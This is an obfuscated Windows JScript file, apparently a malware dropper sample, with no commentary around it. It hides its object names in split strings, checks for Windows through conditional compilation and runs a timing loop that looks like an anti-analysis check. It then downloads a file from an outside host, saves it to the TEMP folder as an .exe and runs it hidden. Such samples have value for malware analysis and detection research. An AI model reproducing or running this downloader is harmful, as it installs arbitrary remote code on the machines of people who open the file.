var D = false;
var RQ = "Create"+"Object";
var DY = function FY() {return WScript[RQ]("WScript"+".Shell");}(), K0 = 11;
var OE = "MSXML2"+".XMLHTTP";
var PY = 2;
var H0 = PY - 2;
function AU(PB){DY["Run"](PB, H0, H0);};
function OH(){return OE + "";};
function UO(P, SF){H0 = H0 * 1; return P - SF;};
function QM(){return RQ;};
/*@cc_on
  @if (@_win32 || @_win64)
    D = true;
  @end
@*/
if (D)
{
var C = "";
function Z(){return 22;};
var OP = 0; var R = 0;
function W()
{
var ZE = new this["Date"]();
var JH = ZE["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var ZE = new this["Date"]();
var WK = ZE["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var ZE = new this["Date"]();
var L = ZE["getUTCMilliseconds"]();
var OP = "CD";
OP = UO(WK, JH);
var R = "S";
R = UO(L, WK);
C = "open";
return UO(OP, R);
}
var MY = false;
var T = false;
for (var H1 = H0; H1 < Z() * 1; H1++){if (W() != H0){
MY = true; 
R = "31" + 11 * OP + R; 
T = true; 
break;
}}
function GJ() {return ((MY == true) && (MY == T)) ? 1 : H0;};
if (MY && GJ() && T){
function H() {return DY["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KAT1iJDcU.ex" + "e";};
 MN = OH();
 FB = WScript[RQ](MN);
 var DF = 1;
do { 
	for (;DF;){
	try {
		if (DF == 1)
		{
			FB[C]("GET", "http://pure-line.com.pl/f6splw", false);
			FB["send"]();
			E = "Sleep";
			DF = 2;
		}
		WScript[E](Z() + 120); 
		if (FB["readystate"] < 2 * 2) continue;
		DF = H0;
		function ZT(K) {var NW = (1, 2, 3, 4, 5, K); return NW;};
		WI = WScript[QM()]("ADODB.Stream");
		MN = WI;
		MN[C]();
		MN["type"] = ZT(1);
		MN["write"](FB["ResponseBody"]);
		WI["position"] = ZT(H0);
		MN["Save" + "ToFile"](H(), 2);
		WI["cl"+"ose"]();
		EK = H();
		AU(EK);
	} catch(NS){};};
}while (DF);
}
}

